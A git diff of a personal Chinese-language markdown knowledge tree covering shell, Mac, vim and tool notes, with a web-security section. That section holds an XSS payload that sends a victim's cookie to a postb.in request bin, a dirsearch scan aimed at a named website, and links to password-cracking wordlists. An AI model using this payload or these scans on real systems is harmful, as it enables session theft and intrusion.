@@ -2,6 +2,7 @@
 title: 计算机知识树
 date: 2019-05-13 14:42:09
 ---
+[TOC]
 [课程资源](https://github.com/Developer-Y/cs-video-courses)
 # DS
 - Algorithm
@@ -1663,6 +1664,8 @@ date: 2019-05-13 14:42:09
       - https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
       - https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials
       - https://github.com/praetorian-inc/Hob0Rules.git
+      - [rockyou2021](https://github.com/ohmybahgosh/RockYou2021.txt)
+        - contains all passwords cracked by 2021 
 - 编码
   - [ascii](https://www.systutorials.com/f/2013/ascii.txt)
   - Base64
@@ -1718,7 +1721,6 @@ date: 2019-05-13 14:42:09
     - 攻击+工具
       - [csrf 攻击](https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)
       - xss
-<<<<<<< HEAD
         - phishing 偷 cookie
           - [Phishing 查询被调参数神站](https://postb.in/)
           - `<a id='a'>click</a><script>document.getElementById('a').href ='https://postb.in/1600766899166-1163333267904?a='+document.cookie;</script>`
@@ -1737,6 +1739,7 @@ date: 2019-05-13 14:42:09
         - path scan
           - [dirsearch](https://github.com/maurosoria/dirsearch)
             - `~/opt/anaconda3/bin/python dirsearch.py -e php,txt,gitignore,Dockerfile -u https://robokracy.com`
+            - `ln -s ~/install/dirsearch/dirsearch.py dirsearch`
         - port scan
           - [nmap](https://nmap.org/download.html)
         - example
@@ -1908,7 +1911,9 @@ date: 2019-05-13 14:42:09
 
 # Linux
 - shell script
+  - `curl cht.sh`
   - `set -o vi` 用vi方式编辑命令行
+  - history
   - 目录文件
     - `cp -R dir1 dir2`
     - `mv dir1 dir2`
@@ -1917,6 +1922,9 @@ date: 2019-05-13 14:42:09
     - `ls -R` 递归list子目录
     - `egrep -r '@In|@Inject' . | cut -d: -f1 | uniq | grep '/src/main/java'`
     - `find files/ -name "*.json" | xargs grep "xxx`
+    - `df -h` 磁盘空间
+    - /var/software/jvm_8/bin/keytool -list -v -keystore "/var/software/jvm_8/jre/lib/security/cacerts" -alias globalrootca
+    - keytool -list -v -keystore "/var/software/jvm_8/jre/lib/security/cacerts" -alias globalrootca
   - 打包
     - `tar -cvf a.tar a`
     - `tar -cvf a.zip a`
@@ -1945,11 +1953,15 @@ date: 2019-05-13 14:42:09
       - mac
         - sed
         - gsed
+          - `brew install gnu-sed `
           - 特定字符串后面加一行`gsed -i "/xxx/a\  xx\(group: 'com.fjd', name: 'ab-c', version: '\$\{com.fjd.test.version\}'\)\n  xxx(group: 'com.fjd', name: 'fjd-sample', version: '\$\{com.fjd.version\}')" dependencies.gradle`
           - 文件最后加一行`gsed -i '$a\xxx' a.txt`
           - 删掉特定字符行`gsed -i "/xxx/d" b1.json`
     - sort
       - `sort --field-separator='\t' --key=2,1`
+    - [xmllint](https://softwaretester.info/test-xml-command-line-with-xmllint/)
+      - `xmllint --xpath '//country/element[@id="xx"]/field[@id="xxx"]/sub/../../../@id' xx.xml`
+
 - 配置
   - `/etc/profile`
   - `~/.bashrc`
@@ -1998,6 +2010,10 @@ date: 2019-05-13 14:42:09
 
 # MAC
 - use brew install
+  - `/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"`
+  - `/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall.sh)"`
+  - `/bin/zsh -c "$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)"`
+  - `/bin/zsh -c "$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/HomebrewUninstall.sh)"`
 - 快捷键
   - Command + Tab 切app
   - lock screen = Command + Ctrl + Q
@@ -2039,9 +2055,13 @@ date: 2019-05-13 14:42:09
   - `brew install zsh`
   - `chsh -s /bin/zsh root`
   - `$ sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"`
+  - `git clone https://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh`
+  - `cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc`
   - theme
     - `vim ~/.zshrc`
-    - ZSH_THEME='risto'
+    - ZSH_THEME='risto' 
+    - ZSH_THEME="powerlevel10k/powerlevel10k"
+      - git clone https://github.com/romkatv/powerlevel10k.git ~/.oh-my-zsh/custom/themes/powerlevel10k
     - `source ~/.zshrc`
 - autojump
   - `brew install autojump`
@@ -2103,8 +2123,13 @@ date: 2019-05-13 14:42:09
   - [vim 文本行逆序化](https://blog.csdn.net/cwcmcw/article/details/44876267)
     - `:g/.*/mo0`
     - `:g/^/mo0`
+  - 删除
+    - 1-10行`:1,10d`
+    - 1-本行`:1,.d`
 - Chrome
   - 切tab cmd+alt+arrow
+- Shell
+  - pbcopy/pbpaste
 
 # Windows
 - 查看pid `wmic process get name, processid|findstr 27284`
@@ -2128,7 +2153,7 @@ date: 2019-05-13 14:42:09
 
 # Tools
 - [正则可视化](https://jex.im/regulex/)
-
+  - stacktrace类+方法：[a-zA-Z0-9$]+\.[a-zA-Z]+\n
 
 # Test
 - UT
